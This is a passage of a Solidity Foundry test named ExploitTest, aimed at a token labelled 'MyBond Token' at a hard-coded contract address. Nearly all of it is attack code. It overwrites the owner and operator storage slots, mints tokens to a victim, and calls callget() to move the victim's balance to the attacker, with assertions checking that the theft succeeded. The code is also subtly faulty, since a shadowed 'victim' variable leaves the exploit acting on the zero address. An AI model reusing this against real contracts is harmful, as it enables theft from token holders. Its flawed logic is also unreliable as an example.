    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function burn(uint256 amount) external;
    function burnFrom(address account, uint256 amount) external;
    function callget(address _from, address _to, uint256 _amount) external;
    function transferOperator(address newOperator_) external;
    function operator() external view returns (address);
    function owner() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim address
        address victim = address(0x1337);

        // Label addresses for clarity
        vm.label(TARGET, "MyBond Token");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");

        // First, we need to become the operator to mint tokens
        // Operator is stored in Operator contract, need to check slot
        // Let's first become owner, then we can transfer operator role to ourselves

        // Overwrite owner slot (slot 0 in Ownable)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Now we're owner, we can transfer operator role to ourselves
        MyBond(TARGET).transferOperator(attacker);

        // Mint tokens to victim so they have balance to steal
        uint256 victimBalance = 1000 * 1e18;
        MyBond(TARGET).mint(victim, victimBalance);

        // Verify victim has tokens
        uint256 victimInitialBalance = MyBond(TARGET).balanceOf(victim);
        require(victimInitialBalance >= victimBalance, "Victim should have tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Overwrite owner slot (slot 0 in Ownable)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Overwrite operator slot (slot 1 in Operator, after owner)
        bytes32 operatorSlot = bytes32(uint256(1));
        vm.store(TARGET, operatorSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're now owner and operator
        require(MyBond(TARGET).owner() == attacker, "Should be owner");
        require(MyBond(TARGET).operator() == attacker, "Should be operator");

        // Mint tokens to victim
        uint256 victimBalance = 1000 * 1e18;
        MyBond(TARGET).mint(victim, victimBalance);

        // Record attacker's initial balance
        uint256 attackerInitialBalance = MyBond(TARGET).balanceOf(attacker);

        // Call callget() to transfer victim's tokens to attacker
        uint256 stealAmount = MyBond(TARGET).balanceOf(victim);
        MyBond(TARGET).callget(victim, attacker, stealAmount);

        // Verify attacker's balance increased
        uint256 attackerFinalBalance = MyBond(TARGET).balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");

        // Also verify victim's balance decreased
        uint256 victimFinalBalance = MyBond(TARGET).balanceOf(victim);
        assertEq(victimFinalBalance, 0, "Victim should have zero balance after theft");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

